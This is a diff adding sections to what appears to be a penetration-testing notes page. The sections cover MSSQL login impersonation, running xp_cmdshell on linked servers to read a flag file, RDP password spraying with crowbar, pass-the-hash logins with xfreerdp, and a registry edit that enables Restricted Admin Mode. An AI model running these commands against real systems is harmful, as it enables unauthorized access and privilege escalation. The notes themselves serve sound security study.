@@ -307,3 +307,74 @@ We must first find users who we can mimic. ```Sysadmins``` have the ability to i
 5> WHERE a.permission_name = 'IMPERSONATE'
 6> GO
 ```
+
+Now if the user ```bob``` can be impersonate, we will execute the following command :
+
+```console
+1> EXECUTE AS LOGIN = 'bob'
+2> SELECT SYSTEM_USER
+3> SELECT IS_SRVROLEMEMBER('sysadmin')
+4> go
+```
+
+### Communicate with Other Databases with MSSQL
+
+Linked servers is a configuration option in MSSQL. A Transact-SQL query that contains tables from another instance of SQL Server, or another database product like Oracle, may generally be executed by the database engine thanks to linked servers, which are typically set up to support this.
+
+1. Identify linked Servers in MSSQL
+
+The following command will list [linked server](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine?view=sql-server-ver16) and mark remote servers with a ```1``` and local ones with a ```0```.
+
+```console
+1> SELECT srvname, isremote FROM sysservers
+2> go
+```
+
+To execute commands on a linked server you can use the following command :
+
+```console
+EXECUTE ('CMD') AT [LINKED.SRV]	
+```
+
+Where ```CMD``` can be a SQL querry or xp_cmdshell like this :
+```console
+EXECUTE('xp_cmdshell ''type c:\Users\Administrator\Desktop\flag.txt''') AT [LINKED.SRV]
+```
+> Note that the single quotes (```'```) are important !
+{: .prompt-warning  }
+
+## RDP
+
+"Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection." (Wikipedia). By default, the server listens on TCP and UDP on port 3389.
+
+### RDP Password Spraying
+
+If we are looking for usernames we may try the password spraying attack. As for any password spraying attack we can use [Hydra](https://nouman404.github.io/Notes/Brute_Force/Brute_Force#hydra) but for RDP we can also use [crowbar](https://www.kali.org/tools/crowbar/). The ```crowbar``` syntax is as follows if we want to spray the password ```password123``` on the whole network :
+
+```console
+crowbar -b rdp -s IP/32 -U USER_LIST -c 'password123'
+```
+
+### RDP connection
+
+When you find yourself with valid credentials, you can connect to the distant machine using tools like [freerdp](https://www.kali.org/tools/freerdp2/#xfreerdp) or [remmina](https://remmina.org/). The full ```xfreerdp``` command where we share a local folder to upload our tools is as follows :
+
+```console
+xfreerdp /v:IP:PORT /u:USERNAME /p:PASSWORD /drive:SHARENAME,"PATH_TO_THE_FILES_TO_SHARE"
+```
+
+### RDP Session Hijacking
+
+### RDP Pass-the-Hash (PtH)
+
+What is wonderful with RDP is that even if we only have the ```NT hash``` and not the clear text password, we can still connect to the machine with the ```Pass-the-Hash``` technique. To use ```xfreerdp``` fot the PtH attack you can do :
+
+```console
+xfreerdp /v:IP /u:USER /pth:HASH
+```
+
+This attack is only possible if the ```Restricted Admin Mode``` is enabled (it is disabled by default). A new registry key ```DisableRestrictedAdmin``` (REG DWORD) under ```HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa``` can be added to enable this. The command below can be used to accomplish it:
+
+```console
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
